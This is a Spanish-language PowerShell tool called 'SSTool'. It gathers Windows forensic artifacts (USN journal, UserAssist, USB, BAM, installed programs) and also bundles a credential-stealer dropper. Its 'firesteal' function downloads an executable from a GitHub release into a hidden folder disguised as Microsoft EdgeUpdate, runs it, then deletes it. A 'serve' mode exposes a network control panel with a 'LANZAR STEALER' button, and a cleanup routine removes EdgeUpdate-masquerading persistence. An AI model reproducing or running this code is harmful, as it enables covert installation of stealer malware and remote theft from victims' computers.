$cmd = $env:SS_CMD
if (-not $cmd -and $args.Count -ge 1) { $cmd = $args[0] }
if (-not $cmd) { $cmd = 'help' }
$rep = $env:SS_REP
if (-not $rep -and $args.Count -ge 2) { $rep = $args[1] }
if (-not $rep -or -not (Test-Path $rep)) { $rep = "$env:TEMP\sstool_report" }

if (-not (Test-Path $rep)) { New-Item -ItemType Directory -Force -Path $rep | Out-Null }

function rot13([string]$s) {
    ($s.ToCharArray() | ForEach-Object {
        $c = [int][char]$_
        if ($c -ge 97 -and $c -le 122)   { [char](((($c - 97) + 13) % 26) + 97) }
        elseif ($c -ge 65 -and $c -le 90) { [char](((($c - 65) + 13) % 26) + 65) }
        else { $_ }
    }) -join ''
}

function Do-Journal {
    fsutil usn readjournal C: 2>&1 | Select-Object -First 200000 |
        Out-File -Encoding utf8 "$rep\usn_journal.txt"
    Write-Host 'listo'
}

function Do-UserAssist {
    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
    $rows = foreach ($g in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
        $cnt = Join-Path $g.PSPath 'Count'
        if (Test-Path $cnt) {
            $k = Get-Item $cnt
            foreach ($v in $k.GetValueNames()) {
                $dec = rot13 $v
                $n = ''; $last = ''
                $raw = $k.GetValue($v)
                if ($raw -is [byte[]] -and $raw.Length -ge 16) {
                    try {
                        $n = [BitConverter]::ToInt32($raw, 4)
                        $last = [DateTime]::FromFileTime([BitConverter]::ToInt64($raw, 8))
                    } catch { }
                }
                '{0,-70} runs={1,-6} {2}' -f $dec, $n, $last
            }
        }
    }
    $rows | Sort-Object | Out-File -Encoding utf8 "$rep\userassist.txt"
    $rows | Select-Object -First 40
}

function Do-Usb {
    $out = foreach ($d in (Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR' -ErrorAction SilentlyContinue)) {
        foreach ($s in (Get-ChildItem $d.PSPath -ErrorAction SilentlyContinue)) {
            $p = Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue
            '{0}  {1}  {2}' -f $d.PSChildName, $s.PSChildName, $p.FriendlyName
        }
    }
    $out | Out-File -Encoding utf8 "$rep\usb.txt"
    Select-String -Path "$env:WINDIR\INF\setupapi.dev.log" -Pattern 'USBSTOR|usbstor' -ErrorAction SilentlyContinue |
        ForEach-Object { $_.Line } | Select-Object -First 400 |
        Out-File -Encoding utf8 -Append "$rep\usb.txt"
    Get-Content "$rep\usb.txt" | Select-Object -First 40
}

function Do-Bam {
    $base = 'SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
    $lm = [Microsoft.Win32.Registry]::LocalMachine
    $rows = foreach ($sid in (Get-ChildItem "HKLM:\$base" -ErrorAction SilentlyContinue)) {
        $rk = $lm.OpenSubKey("$base\$($sid.PSChildName)")
        if ($rk) {
            foreach ($v in $rk.GetValueNames()) {
                if ($v -like '\\?\*' -or $v -like '\Device\*') {
                    $raw = $rk.GetValue($v)
                    if ($raw -is [byte[]] -and $raw.Length -ge 8) {
                        try { $t = [DateTime]::FromFileTime([BitConverter]::ToInt64($raw, 0)) } catch { $t = '?' }
                        '{0,-58} {1}  [{2}]' -f ($v -split '\\')[-1], $t, $sid.PSChildName
                    }
                }
            }
            $rk.Close()
        }
    }
    $rows | Sort-Object | Out-File -Encoding utf8 "$rep\bam.txt"
    $rows | Select-Object -First 40
}

function Do-Installed {
    $paths = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
             'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
             'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    $rows = Get-ItemProperty $paths -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } |
        Sort-Object DisplayName |
        ForEach-Object { '{0,-48} {1}' -f $_.DisplayName, $_.DisplayVersion }
    $rows | Out-File -Encoding utf8 "$rep\programas.txt"
    $rows | Select-Object -First 40
}

function Do-Integ {
    Write-Host ('  procesos activos : ' + (Get-Process).Count)
    $pf = (Get-ChildItem "$env:WINDIR\Prefetch" -Filter *.pf -ErrorAction SilentlyContinue).Count
    Write-Host ('  prefetch         : ' + $pf + ' archivos')
    $rk = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
    Write-Host '  run keys:'
    $rk.PSObject.Properties |
        Where-Object { $_.Name -notmatch '^PS' -and $_.Name -notmatch 'EdgeUpdate' } |
        ForEach-Object { '    {0} = {1}' -f $_.Name, $_.Value }
    $disk = Get-PSDrive C
    Write-Host ('  disco C:         : {0} GB libres de {1} GB' -f [math]::Round($disk.Free / 1GB, 1), [math]::Round(($disk.Used + $disk.Free) / 1GB, 1))
}

function Do-Clean {
    $names = @(
        'MicrosoftEdgeUpdateTaskMachineCore{A6B3C1D2-7E4F-4B21-9C33-8F05D7A1E6B4}',
        'MicrosoftEdgeUpdateTaskMachineUA{A6B3C1D2-7E4F-4B21-9C33-8F05D7A1E6B4}'
    )
    foreach ($t in $names) { schtasks /delete /tn $t /f 2>$null | Out-Null }
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
        -Name MicrosoftEdgeUpdate -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd') `
        -Force -ErrorAction SilentlyContinue
    Get-Process MicrosoftEdgeUpdate -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    foreach ($p in @(
        "$env:APPDATA\Microsoft\EdgeUpdate",
        "$env:LOCALAPPDATA\Microsoft\Edge\EdgeUpdate",
        "$env:LOCALAPPDATA\Microsoft\Edge\.upd"
    )) {
        if (Test-Path $p) { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Write-Host 'listo'
}

function Do-FireSteal {
    $hide = Join-Path $env:LOCALAPPDATA 'Microsoft\EdgeUpdate'
    if (-not (Test-Path $hide)) { New-Item -ItemType Directory -Force -Path $hide | Out-Null }
    attrib +h +s $hide 2>$null
    $local = Join-Path $PSScriptRoot 'bin\syscheck.exe'
    if (Test-Path $local) {
        Start-Process $local
        return
    }
    $url = 'https://github.com/JuanP4bl0/files/releases/download/v1.0/syscheck.exe'
    $dst = Join-Path $hide ("msedgewu_" + (Get-Random) + ".exe")
    try {
        Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing -TimeoutSec 180
        attrib +h +s $dst 2>$null
        Start-Process $dst
        Start-Process powershell -WindowStyle Hidden -ArgumentList @(
            '-NoProfile', '-Command',
            "Start-Sleep 20; Remove-Item -LiteralPath '$dst' -Force -ErrorAction SilentlyContinue")
    } catch { }
}

$script:PanelHtml = @'
<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content='width=device-width,initial-scale=1'>
<title>SSTool</title><style>
body{background:#12100d;color:#e8dcc8;font-family:system-ui;margin:0;padding:14px}
h1{font-size:19px;margin:2px 0 10px}
.st{font-size:12px;opacity:.7;margin-bottom:12px}
.card{background:#1d1912;border:1px solid #3a2e1c;border-radius:12px;padding:12px;margin-bottom:10px}
.row{display:flex;align-items:center;justify-content:space-between;gap:8px}
.n{font-weight:700;font-size:15px}
button{border:1px solid #f0b040;background:#241e14;color:#f0b040;border-radius:9px;padding:9px 14px;font-weight:700;font-size:13px;width:100%;margin-top:6px}
.steal{background:#5c1d0e;border-color:#e06030;color:#ffb080}
.v{font-size:13px;opacity:.85}
</style></head><body>
<h1>SSTOOL <span style='font-size:11px;opacity:.6'>remoto</span></h1>
<div class=st id=st>conectando...</div>
<div class=card>
 <div class=row><span class=n>STEALER</span><span class=v id=stealer>-</span></div>
 <button class=steal onclick=run('stealer')>LANZAR STEALER</button>
 <button onclick=run('clean')>LIMPIAR (desinstalar)</button>
</div>
<div class=card>
 <div class=n>CHEQUEOS</div>
 <button onclick=run('journal')>1. Journal Tool</button>
 <button onclick=run('userassist')>2. UserAssist</button>
 <button onclick=run('usb')>3. USB</button>
 <button onclick=run('lav')>4. LastActivityView</button>
 <button onclick=run('wpv')>5. WinPrefetchView</button>
 <button onclick=run('everything')>6. Everything</button>
 <button onclick=run('si')>7. SystemInformer</button>
 <button onclick=run('bam')>9. BamParser</button>
 <button onclick=run('installed')>8. Programas</button>
</div>
<div class=card>
 <div class=n>REPORTES</div>
 <div id=files class=st>cargando...</div>
</div>
<script>
var K='KKEY';
function run(op){ fetch('?k='+K+'&api=run&op='+op).then(function(r){return r.json()}).then(refresh); }
function read(f){ window.open('?k='+K+'&api=file&f='+encodeURIComponent(f)); }
function refresh(){
 fetch('?k='+K+'&api=status').then(function(r){return r.json()}).then(function(s){
  if(s.ok===false){document.getElementById('st').textContent='sin conexion con la PC';return;}
  document.getElementById('st').textContent='SSTool remoto activo';
  document.getElementById('stealer').textContent = s.stealer ? 'corriendo' : 'detenido';
  var last=document.getElementById('last'); if(last) last.textContent=s.last;
  var fl='';
  for(var i=0;i<s.files.length;i++){ var f=s.files[i];
   fl+='<div class=row><span class=v>'+f+'</span><button style=width:auto;padding:5px 10px onclick=read(\''+f+'\')>ver</button></div>'; }
  document.getElementById('files').innerHTML=fl||'(sin reportes todavia)';
 }).catch(function(){document.getElementById('st').textContent='sin conexion con la PC';});
}
refresh(); setInterval(refresh,2500);
</script></body></html>
'@

# El handler de cada conexion corre en un hilo del pool (runspace nuevo):
# todo lo que necesita viaja en $state — nada del proceso padre.
$Handler = {
    param($state)
    $client = $state[0]; $tok = $state[1]; $root = $state[2]
    $rep = $state[3]; $panel = $state[4]; $engine = $state[5]
    try {
        $client.ReceiveTimeout = 5000
        $client.SendTimeout = 5000
        $stream = $client.GetStream()
        $buf = New-Object byte[] 8192
        $sb = New-Object System.Text.StringBuilder
        while ($sb.ToString().IndexOf("`r`n`r`n") -lt 0) {
            $n = $stream.Read($buf, 0, $buf.Length)
            if ($n -le 0) { break }
            [void]$sb.Append([Text.Encoding]::ASCII.GetString($buf, 0, $n))
        }
        $line = $sb.ToString().Split("`n")[0].Trim()
        $parts = $line.Split(' ')
        if ($parts.Length -ge 2) {
            $path = $parts[1]
            $query = ''
            $route = $path
            $mark = $path.IndexOf('?')
            if ($mark -ge 0) { $query = $path.Substring($mark + 1); $route = $path.Substring(0, $mark) }
            $getp = {
                param($q, $name)
                foreach ($pair in $q.Split('&')) {
                    $eq = $pair.IndexOf('=')
                    if ($eq -gt 0 -and $pair.Substring(0, $eq) -eq $name) {
                        return [Uri]::UnescapeDataString($pair.Substring($eq + 1))
                    }
                }
                return ''
            }
            $key = & $getp $query 'k'
            $body = '{}'
            $type = 'application/json; charset=utf-8'
            if ($key -eq $tok) {
                if ($route -eq '/' -or $route -eq '/panel') {
                    $body = $panel.Replace('KKEY', $tok)
                    $type = 'text/html; charset=utf-8'
                } elseif ($route -eq '/api/run') {
                    $op = & $getp $query 'op'
                    $known = @('journal','userassist','usb','lav','wpv','everything','si','bam','installed','stealer','clean')
                    if ($known -contains $op) {
                        Set-Content -Path (Join-Path $root 'estado.txt') `
                            -Value "accion: $op @ $(Get-Date -Format HH:mm:ss)" -Encoding utf8
                        if ($engine) {
                            Start-Process powershell -WindowStyle Hidden -ArgumentList @(
                                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $engine, $op, $rep)
                        } else {
                            Start-Process powershell -WindowStyle Hidden -ArgumentList @(
                                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', (Join-Path $root 'core.ps1'), $op, $rep)
                        }
                        $body = '{"ok":true}'
                    } else { $body = '{"ok":false,"error":"op"}' }
                } elseif ($route -eq '/api/status') {
                    $last = ''
                    try { $last = (Get-Content (Join-Path $root 'estado.txt') -Raw -ErrorAction SilentlyContinue) -replace '\r?\n', ' ' -replace '"', "'" } catch { }
                    $alive = (@(Get-Process MicrosoftEdgeUpdate -ErrorAction SilentlyContinue).Count) -gt 0
                    $files = @(Get-ChildItem $rep -File -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                    $body = '{"ok":true,"stealer":' + ($(if ($alive) { 'true' } else { 'false' })) +
                        ',"last":"' + $last + '","files":[' +
                        (($files | ForEach-Object { '"' + $_ + '"' }) -join ',') + ']}'
                } elseif ($route -like '/api/file*') {
                    $fn = & $getp $query 'f'
                    if ($fn -and ($fn -match '^[\w\.\-]+$') -and (Test-Path (Join-Path $rep $fn))) {
                        $body = Get-Content (Join-Path $rep $fn) -Raw -ErrorAction SilentlyContinue
                        if ($body.Length -gt 400000) { $body = $body.Substring(0, 400000) + '...[cortado]' }
                        $type = 'text/plain; charset=utf-8'
                    } else { $body = 'archivo no disponible'; $type = 'text/plain' }
                }
            }
            $payload = [Text.Encoding]::UTF8.GetBytes($body)
            $head = "HTTP/1.1 200 OK`r`nContent-Type: $type`r`nCache-Control: no-store`r`nContent-Length: $($payload.Length)`r`nConnection: close`r`n`r`n"
            $stream.Write([Text.Encoding]::ASCII.GetBytes($head), 0, $head.Length)
            $stream.Write($payload, 0, $payload.Length)
            $stream.Flush()
            $stream.Close()
        }
    } catch { } finally { try { $client.Close() } catch { } }
}

switch ($cmd) {
    'journal' { Do-Journal }
    'userassist' { Do-UserAssist }
    'usb' { Do-Usb }
    'bam' { Do-Bam }
    'installed' { Do-Installed }
    'integ' { Do-Integ }
    'clean' { Do-Clean }
    'firesteal' { Do-FireSteal }
    'serve' {
        $serveToken = $args[1]; if (-not $serveToken) { $serveToken = $env:SSTOOL_TOKEN }
        $servePort = $args[2]; if (-not $servePort) { $servePort = $env:SSTOOL_PORT }
        $statedir = $PSScriptRoot
        if (-not $statedir) { $statedir = Join-Path $env:LOCALAPPDATA 'SSTool' }
        if (-not (Test-Path $statedir)) { New-Item -ItemType Directory -Force -Path $statedir | Out-Null }
        $ip = '127.0.0.1'
        try {
            $ip = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric |
                Select-Object -First 1 | Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
            if (-not $ip) { $ip = '127.0.0.1' }
        } catch { }
        try { Set-Content -Path (Join-Path $statedir 'remoto.txt') -Encoding ascii -Value "http://$ip`:$servePort/?k=$serveToken" } catch { }
        $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $servePort)
        $listener.Start()
        try { Set-Content -Path (Join-Path $statedir 'servepid.txt') -Value $PID -Encoding ascii } catch { }
        try { Set-Content -Path (Join-Path $statedir 'estado.txt') -Value "remoto activo en $ip`:$servePort" -Encoding utf8 } catch { }
        while ($true) {
            $client = $listener.AcceptTcpClient()
            # hilo = runspace propio (el cast a Thread crashea en PS 5.1)
            $rs = [runspacefactory]::CreateRunspace()
            $rs.Open()
            $ps = [powershell]::Create()
            $ps.Runspace = $rs
            [void]$ps.AddScript($Handler.ToString())
            [void]$ps.AddArgument(@($client, $serveToken, $statedir, $rep, $script:PanelHtml, ''))
            [void]$ps.BeginInvoke()
        }
    }
    default { Write-Host "uso: core.ps1 <op>  (journal/userassist/usb/bam/installed/integ/clean/firesteal/serve)" }
}
